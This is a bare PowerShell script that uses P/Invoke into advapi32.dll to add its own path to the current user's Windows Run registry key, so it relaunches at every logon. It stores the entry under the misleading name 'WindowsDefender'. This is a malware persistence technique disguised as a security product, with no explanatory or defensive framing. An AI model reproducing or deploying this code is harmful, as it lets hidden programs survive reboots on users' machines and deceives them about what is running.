Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class R{[DllImport("advapi32.dll")]public static extern int RegCreateKeyEx(UIntPtr hKey,string lpSubKey,int Reserved,string lpClass,int dwOptions,int samDesired,IntPtr lpSecurityAttributes,out UIntPtr phkResult,out int lpdwDisposition);[DllImport("advapi32.dll")]public static extern int RegSetValueEx(UIntPtr hKey,string lpValueName,int Reserved,int dwType,string lpData,int cbData);[DllImport("advapi32.dll")]public static extern int RegCloseKey(UIntPtr hKey);}
"@
$k=[UIntPtr]::Zero;$d=0;[R]::RegCreateKeyEx([UIntPtr]0x80000001,"Software\Microsoft\Windows\CurrentVersion\Run",0,$null,0,0x20006,[IntPtr]::Zero,[ref]$k,[ref]$d);[R]::RegSetValueEx($k,"WindowsDefender",0,1,$PSCommandPath,$PSCommandPath.Length);[R]::RegCloseKey($k)
